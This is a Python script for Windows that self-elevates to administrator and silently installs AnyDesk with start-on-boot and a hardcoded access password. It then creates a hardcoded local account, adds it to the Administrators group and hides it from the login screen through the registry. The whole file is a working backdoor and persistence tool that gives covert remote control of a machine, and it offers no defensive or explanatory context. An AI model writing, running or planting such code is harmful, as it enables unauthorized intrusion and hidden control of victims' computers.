import os
import subprocess
import requests
import getpass
import ctypes
import sys
import winreg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def install_anydesk(install_path="C:\\ProgramData\\AnyDesk",
                   anydesk_url="http://download.anydesk.com/AnyDesk.exe",
                   password="J9kzQ2Y0qO",
                   admin_username="oldadministrator",
                   admin_password="jsbehsid#Zyw4E3"):
    try:
        if is_admin():
            # Create the installation directory if it doesn't exist
            if not os.path.exists(install_path):
                os.makedirs(install_path)

            # Download AnyDesk
            anydesk_exe_path = os.path.join(install_path, "AnyDesk.exe")
            with open(anydesk_exe_path, 'wb') as exe_file:
                response = requests.get(anydesk_url)
                exe_file.write(response.content)

            # Install AnyDesk silently
            install_command = f'"{anydesk_exe_path}" --install "{install_path}" --start-with-win --silent'
            subprocess.run(install_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Set AnyDesk password
            set_password_command = f'"{anydesk_exe_path}" --set-password={password}'
            subprocess.run(set_password_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            # Create a new user account
            subprocess.run(['net', 'user', admin_username, admin_password, '/add'], check=True)

            # Add the user to the Administrators group
            subprocess.run(['net', 'localgroup', 'Administrators', admin_username, '/add'], check=True)

            # Hide the user from the Windows login screen
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist')
            winreg.SetValueEx(key, admin_username, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)

            # Get AnyDesk ID
            get_id_command = f'"{anydesk_exe_path}" --get-id'
            subprocess.run(get_id_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            print("Installation completed successfully.")
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    except Exception as e:
        print(f"Error: {e}")
        print("Installation failed.")

# Call the install_anydesk function with default values
install_anydesk()
